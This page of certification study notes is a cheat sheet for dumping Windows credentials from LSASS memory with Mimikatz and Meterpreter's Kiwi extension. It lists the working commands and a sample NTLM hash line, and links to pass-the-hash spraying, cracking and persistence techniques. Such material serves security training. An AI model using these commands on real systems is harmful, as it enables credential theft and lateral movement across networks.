---
title: "Mimikatz & Kiwi: dumping Windows credentials from memory"
description: "Extract cleartext passwords, hashes and secrets from LSASS."
pubDate: 2026-11-11
category: "Cybersecurity"
source: "INE Certification"
lang: "bash"
tags: ["mimikatz", "kiwi", "credential-dumping", "windows"]
draft: false
---

Mimikatz pulls cleartext passwords, NTLM hashes, and Kerberos tickets straight out of the `lsass.exe` process's memory, the same process Windows itself uses to hold credentials for active logon sessions. Metasploit bundles the same functionality as a [meterpreter](/snippets/cybersecurity/tools/exploitation-frameworks/meterpreter) extension called Kiwi, which is usually the more convenient way to run it if you're already in a session.

## Standalone mimikatz.exe

```bash
mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords
```

## Kiwi (meterpreter extension, same capability)

```bash
load kiwi
creds_all           # everything it can find
lsa_dump_sam        # local SAM credentials
lsa_dump_secrets    # LSA secrets
```

Dumped hashes come back in the format `Username:RID:LM:NTLM:::`, like `Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec:::`.

:::note[Privileges required]
Both tools need elevated (SYSTEM/admin-equivalent) privileges to read LSASS at all, so privilege escalation is a prerequisite. Kiwi is generally the easier of the two to reach for since it's already inside your existing meterpreter session with no extra binary to transfer.
:::

## Related

- [Windows hash dumping and pass-the-hash](/snippets/cybersecurity/exploitation/post-exploitation-persistence/windows-hash-dump-pass-the-hash) — the full workflow this tool feeds into
- [CrackMapExec](/snippets/cybersecurity/tools/credential-attack-tools/crackmapexec) — spray the dumped hashes across the network via pass-the-hash
- [Hashcat](/snippets/cybersecurity/tools/credential-attack-tools/hashcat) and [John the Ripper](/snippets/cybersecurity/tools/credential-attack-tools/john-the-ripper) — crack the dumped hashes instead of passing them
- [Windows persistence](/snippets/cybersecurity/exploitation/post-exploitation-persistence/windows-persistence) — keep access once these credentials are captured
- [Meterpreter essentials](/snippets/cybersecurity/tools/exploitation-frameworks/meterpreter) — where the `load kiwi` command is run from
